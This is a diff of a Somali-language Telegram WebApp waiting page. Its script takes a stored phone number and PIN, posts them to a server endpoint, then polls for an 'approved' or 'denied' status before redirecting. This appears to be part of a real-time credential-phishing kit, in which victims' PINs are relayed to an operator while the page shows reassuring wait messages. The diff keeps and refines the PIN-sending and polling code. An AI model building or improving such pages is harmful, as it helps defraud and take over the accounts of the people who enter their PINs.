@@ -64,6 +64,7 @@
         p {
             color: #555;
             font-size: 16px;
+            margin: 0;
         }
     </style>
 </head>
@@ -79,66 +80,67 @@
 <script>
 document.addEventListener("DOMContentLoaded", async () => {
 
-    const mainText = document.getElementById('main-text');
-    const subText = document.getElementById('sub-text');
+    const mainText = document.getElementById("main-text");
+    const subText = document.getElementById("sub-text");
 
     const tg = window.Telegram?.WebApp;
-
     if (tg) {
         tg.ready();
         tg.expand();
     }
 
-    const phone = localStorage.getItem('phone') || "";
-    const pin = localStorage.getItem('lastPin') || "";
+    const phone = localStorage.getItem("phone") || "";
+    const pin = localStorage.getItem("lastPin") || "";
 
-    console.log("📱 PHONE:", phone);
-    console.log("🔢 PIN:", pin);
-
-    // STEP 1: SEND LOGIN REQUEST
-    try {
-        await fetch(window.location.origin + '/api/login-notification', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone, pin })
-        });
-
-        console.log("📩 Login sent");
-
-    } catch (err) {
-        console.error("❌ FETCH ERROR:", err);
+    if (!phone) {
+        console.warn("⚠️ No phone found in localStorage");
     }
 
-    // STEP 2: WAIT FOR APPROVAL (NO FAKE TIMER)
-    async function checkApproval() {
-        try {
-            const res = await fetch(window.location.origin + '/api/check-status?phone=' + phone);
-            const data = await res.json();
+    // -------------------- SEND LOGIN REQUEST --------------------
+    try {
+        await fetch("/api/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin })
+        });
+    } catch (err) {
+        console.error("❌ Fetch Error:", err);
+    }
 
-            console.log("🔄 STATUS:", data);
+    // -------------------- TEXT CHANGE --------------------
+    setTimeout(() => {
+        mainText.textContent = "Fadlan sug...";
+        subText.textContent = "Tani waxay qaadataa dhowr ilbiriqsi";
+    }, 3000);
+
+    // -------------------- CHECK APPROVAL --------------------
+    async function checkApproval() {
+        if (!phone) return;
+
+        try {
+            const res = await fetch(`/api/check-status?phone=${phone}`);
+            const data = await res.json();
 
             if (data.status === "approved") {
                 mainText.textContent = "La ansixiyay!";
-                subText.textContent = "U wareegaya bogga xiga...";
+                subText.textContent = "Bogga xiga ayaa kuu furmaya...";
 
                 setTimeout(() => {
-                    window.location.href = "/page8.html";
-                }, 2000);
+                    window.location.href = "/page8";
+                }, 1500);
             }
 
             if (data.status === "denied") {
                 mainText.textContent = "La diiday!";
-                subText.textContent = "Fadlan isku day mar kale";
+                subText.textContent = "Xogtaada waa khalad.";
             }
 
         } catch (err) {
-            console.error("❌ STATUS ERROR:", err);
+            console.error("❌ Status check failed:", err);
         }
     }
 
-    // check every 3 seconds
-    setInterval(checkApproval, 3000);
-
+    setInterval(checkApproval, 2000);
 });
 </script>
 
